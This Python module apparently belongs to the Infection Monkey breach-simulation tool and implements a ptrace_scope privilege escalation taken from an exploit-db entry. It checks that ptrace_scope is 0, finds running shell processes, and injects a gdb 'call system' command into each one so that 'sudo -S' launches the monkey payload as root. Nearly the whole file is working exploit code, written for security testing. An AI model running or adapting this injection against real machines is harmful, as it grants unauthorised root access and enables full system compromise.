"""
    Implementation is based on 'ptrace_scope' misconfiguration Local Privilege Escalation
    https://www.exploit-db.com/exploits/46989
    if  /proc/sys/kernel/yama/ptrace_scope = 0 and there is a process with uid as the user running as root
"""
import os
import subprocess
from infection_monkey.pe.actions import HostPrivExploiter
from infection_monkey.pe.actions.tools import shell, check_system, check_running
from logging import getLogger

LOG = getLogger(__name__)

__author__ = "D3fa1t"

pidOfShells = "pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'"  # list of all well known shells
runMonkey = "echo 'call system(\"echo | sudo -S %(commandline)s >/dev/null 2>&1 \")' "
ptrace_scope = "cat /proc/sys/kernel/yama/ptrace_scope"
GDB = "gdb -q -n -p %(pid)s "  # connect to process pid


def check():
    """
    Checks if the machine is vulnerable by reading the value of
    /proc/sys/kernel/yama/ptrace_scope, if it's zero then its vulnerable.
    :return: True if vulnerable, else False
    """
    if shell(ptrace_scope) == '0':
        return True
    return False


class PtraceScopeExploiter(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""
        self.file_name = ""
        self.runnableDistro = ("ubuntu", "linux")

    def try_priv_esc(self, command_line):
        """
        The function takes in the command line to run the monkey as an argument
        and tries to run the monkey as a root user.
        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
        :return: True if the pe is successful
        """
        # Check if the exploit can be tried on this distro
        if not check_system(self.runnableDistro):
            return False

        self.file_path = command_line.split(' ')[0]
        self.file_name = self.file_path.split('/')[-1]

        # check if the machine is vulnerable
        if not check():
            LOG.error("Ptrace_scope is not 0, The machine is not vulnerable!")
            return False

        pidlist = shell(pidOfShells).split('\n')

        # Iterate through all the process id gathered and inject into them
        for pid in pidlist:
            # ("Trying to inject %s" % pid)
            gdb = GDB % {'pid': pid}
            run_monkey = runMonkey % {'commandline': command_line}
            print(run_monkey + " | " + gdb)
            shell(run_monkey + " | " + gdb)

            # Check if the injection was successful by checking if the owner of the monkey is root
            if check_running(self.file_name):
                # monkey is running as root
                LOG.info("Successfully injected into the process!")

                LOG.info("Executed monkey process as root with command line: %s", command_line)
                return True

        # Privilege escalation failed
        LOG.info("Ptrace_scope Privilege escalation was not successful!")
        return False



